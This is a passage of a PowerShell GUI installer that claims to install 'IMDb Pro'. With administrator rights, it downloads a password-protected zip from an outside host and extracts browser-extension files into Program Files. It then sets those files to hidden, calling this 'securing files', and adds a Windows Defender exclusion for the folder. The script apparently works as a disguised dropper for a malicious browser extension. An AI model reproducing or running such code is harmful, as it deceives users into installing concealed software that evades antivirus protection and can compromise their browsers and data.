                    Update-Log "7-Zip extraction failed with exit code: $($process.ExitCode)" "Red"
                }
            }
            catch {
                Update-Log "7-Zip extraction error: $($_.Exception.Message)" "Red"
            }
        }
    }
    
    Update-Log "All extraction methods failed" "Red"
    return $false
}

# Function to hide files
function Hide-SensitiveFiles {
    param([string]$FolderPath)
    
    Update-Log "Attempting to hide sensitive files in: $FolderPath" "Cyan"
    
    # List all files in the directory and subdirectories
    $allFiles = Get-ChildItem $FolderPath -Recurse -File
    Update-Log "Found $($allFiles.Count) files total" "Cyan"
    
    # List the files for debugging
    foreach ($file in $allFiles) {
        Update-Log "Found file: $($file.FullName)" "Cyan"
    }
    
    # Files we want to hide
    $targetFiles = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
    $hiddenCount = 0
    
    foreach ($targetFile in $targetFiles) {
        # Look for the file in the directory and subdirectories
        $filesToHide = $allFiles | Where-Object { $_.Name -eq $targetFile }
        
        if ($filesToHide.Count -eq 0) {
            Update-Log "Target file not found: $targetFile" "Yellow"
            continue
        }
        
        foreach ($file in $filesToHide) {
            try {
                # Set file attributes to Hidden
                Set-ItemProperty -Path $file.FullName -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
                Update-Log "Hidden file: $($file.FullName)" "Green"
                $hiddenCount++
            }
            catch {
                Update-Log "Failed to hide file $($file.FullName): $($_.Exception.Message)" "Red"
            }
        }
    }
    
    Update-Log "Successfully hid $hiddenCount files" "Green"
}

# Main installation function
function Start-Installation {
    $installButton.Enabled = $false
    $logTextBox.Clear()
    
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb_pro_$([Guid]::NewGuid().ToString()).zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Check admin privileges
        Update-Status "Checking administrator privileges..." 10
        Update-Log "Checking administrator privileges..." "Cyan"
        
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0
            Update-Log "ERROR: Administrator privileges required" "Red"
            [System.Windows.Forms.MessageBox]::Show("Please run this installer as Administrator.", "Elevation Required", "OK", "Warning")
            $installButton.Enabled = $true
            return
        }
        
        Update-Log "Administrator privileges confirmed" "Green"
        
        # Create installation directory
        Update-Status "Creating installation directory..." 20
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
            Update-Log "Created installation directory: $installPath" "Green"
        }
        
        # Download file
        Update-Status "Downloading IMDb Pro package..." 30
        $downloadSuccess = Download-File -Url $downloadUrl -OutputPath $tempFile
        
        if (-not $downloadSuccess) {
            throw "Download failed"
        }
        
        Update-Status "Download completed" 50
        
        # Extract ZIP
        Update-Status "Extracting files..." 70
        $extractionSuccess = Extract-ZIP -ZipFile $tempFile -Destination $installPath -Password $zipPassword
        
        if (-not $extractionSuccess) {
            throw "Extraction failed"
        }
        
        Update-Status "Extraction completed" 85
        
        # Hide sensitive files
        Update-Status "Securing files..." 90
        Hide-SensitiveFiles -FolderPath $installPath
        
        # Clean up
        Update-Status "Finalizing installation..." 95
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
            Update-Log "Cleaned up temporary file" "Green"
        }
        
        # Add Windows Defender exclusion
        try {
            Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
            Update-Log "Added Windows Defender exclusion" "Green"
        }
        catch {
            Update-Log "Failed to add Windows Defender exclusion: $($_.Exception.Message)" "Yellow"
        }
        
        # Success
        Update-Status "Installation completed successfully!" 100
        Update-Log "Installation completed successfully!" "Green"
        
        $installButton.Text = "Installation Complete"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        
        [System.Windows.Forms.MessageBox]::Show(
            "IMDb Pro has been successfully installed!`n`nLocation: $installPath",
            "Installation Complete",
            "OK",
            "Information"
        )
    }
    catch {
        Update-Status "Installation failed" 0
        Update-Log "Installation failed: $($_.Exception.Message)" "Red"
        
        # Clean up on error
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Update-Log "Cleaned up temporary file after error" "Yellow"
        }
        
        $installButton.Text = "Retry Installation"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)",
            "Installation Error",
            "OK",
            "Error"
        )
    }
}

# Button click event
 $installButton.Add_Click({ Start-Installation })

# Show the form
[System.Windows.Forms.Application]::EnableVisualStyles()
 $mainForm.ShowDialog() | Out-Null
